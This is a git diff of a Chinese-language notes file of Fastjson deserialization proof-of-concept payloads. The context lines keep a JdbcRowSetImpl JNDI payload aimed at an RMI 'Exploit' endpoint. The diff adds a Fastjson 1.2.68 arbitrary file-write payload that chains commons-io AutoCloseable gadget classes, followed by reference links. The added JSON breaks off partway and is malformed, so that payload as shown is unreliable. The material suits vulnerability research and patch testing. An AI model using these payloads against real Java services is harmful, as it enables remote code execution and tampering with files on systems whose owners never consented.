@@ -230,3 +230,14 @@ poc:
 ```json
 {"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}}}
 ```
+
+
+#### 1.2.68的随缘的文件写入：
+```json
+{"cqq":{"@type":"java.util.Currency","val":{"currency":{"writer":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.output.FileWriterWithEncoding","file":"/Users/xxx/GitProjects/demo/output.txt","encoding":"UTF-8"},"outputStream":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.output.WriterOutputStream","writeImmediately":true,"bufferSize":4,"charsetName":"UTF-8","writer":{"$ref":"$.currency.writer"}},"charInputStream":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.CharSequenceInputStream","charset":"UTF-8","bufferSize":4,"s":{"@type":"java.lang.String""test by cqq!
+
+```
+
+参考：
+- https://github.com/su18/fastjson-commons-io
+- [Fastjson 68 commons-io AutoCloseable](https://su18.org/post/fastjson-1.2.68/)
